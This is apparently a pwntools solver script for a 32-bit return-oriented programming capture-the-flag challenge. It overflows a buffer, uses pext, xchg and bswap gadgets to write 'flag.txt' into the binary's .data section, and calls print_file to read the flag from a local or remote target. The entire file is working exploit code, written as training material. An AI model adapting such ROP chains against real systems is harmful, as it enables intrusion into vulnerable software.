#!/usr/bin/env python
# coding: utf-8
import sys

# pip install pwn
from pwn import *

def clc_eax(fix, char):
    print(fix)
    print(char)
    i = len(char)-1
    r = ''
    for i_f in range(len(fix)-1, 0, -1):
        if fix[i_f] == char[i]:
            r = '1'+r
            i = i-1
        else:
            r = '0'+r
    
        if i == -1:
            print(r)
            return int(r,2)

def search(byte_arr, elf):
    position = next(elf.search(byte_arr))
    log.info(f'Found {str(byte_arr)[2:-1]} @ {hex(position)}')
    return position 

def main(args):
    p = None
    
    if len(args) == 4:
        context.binary = elf = ELF(args[1])
        p = remote(args[2], int(args[3]))
    elif len(args) == 2:
        context.binary = elf = ELF(args[1])
        p = elf.process()
    else:
        print("ERROR: use solver <process> OR <host> <port>")
        sys.exit(0)
    
    exploit(p, elf)
    
    sys.exit(0)

def exploit(p, elf):
    '''
    ;-- questionableGadgets:
            0x08048543      89e8           mov eax, ebp
            0x08048545      bbbababab0     mov ebx, 0xb0bababa
            0x0804854a      c4e262f5d0     pext edx, ebx, eax
            0x0804854f      b8efbeadde     mov eax, 0xdeadbeef
            0x08048554      c3             ret
            0x08048555      8611           xchg byte [ecx], dl
            0x08048557      c3             ret
            0x08048558      59             pop ecx
            0x08048559      0fc9           bswap ecx
            0x0804855b      c3             ret

    '''
    offset = 44

    payload  = b'A'*offset
    
    pop_ecx_bswap    = 0x08048558
    xchg_mecx_dl     = 0x08048555
    pext             = 0x08048543
    pop_ebp          = 0x080485bb
    pop_esi_edi_ebp  = 0x080485b9

    fix_bin = str(bin(0xb0bababa))[2:]
    f_bin   = bin(ord('f'))[2:]
    l_bin   = bin(ord('l'))[2:]
    a_bin   = bin(ord('a'))[2:]
    g_bin   = bin(ord('g'))[2:]
    dot_bin = bin(ord('.'))[2:]
    t_bin   = bin(ord('t'))[2:]
    x_bin   = bin(ord('x'))[2:]

    

    where = 0x0804a018 #0x00001018    0x8 0x0804a018    0x8 -rw- .data
    '''
    pop ecx
    bswap ecx
    ret
    xchg byte [ecx], dl
    ret
    '''
    #gdb.attach(p)

    val = clc_eax(fix_bin, f_bin)
    payload += p32(pop_ebp)+p32(val)
    payload += p32(pext)
    payload += p32(pop_ecx_bswap)+p32(where, endian = 'big') #because then swap 
    payload += p32(xchg_mecx_dl)

    val = clc_eax(fix_bin, l_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+1, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl) 

    val = clc_eax(fix_bin, a_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+2, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl) 

    val = clc_eax(fix_bin, g_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+3, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl)

    val = clc_eax(fix_bin, dot_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+4, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl)

    val = clc_eax(fix_bin, t_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+5, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl)

    val = clc_eax(fix_bin, x_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+6, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl)

    val = clc_eax(fix_bin, t_bin)
    payload += p32(pop_ebp)+p32(val) 
    payload += p32(pext) 
    payload += p32(pop_ecx_bswap)+p32(where+7, endian = 'big') #because then swap  
    payload += p32(xchg_mecx_dl)
    
    rop = ROP(elf)
    rop.call(elf.plt['print_file'], [where])
    payload += rop.chain()
    #payload += p32(elf.plt['print_file'])+p32(where)+p32(where)
    print(p.readuntil("> "))
    p.sendline(payload)
    
    log.success(f'FLAG: {str(p.recvall()[-33:-1])[1:]}')

if __name__ == "__main__":
	main(sys.argv)
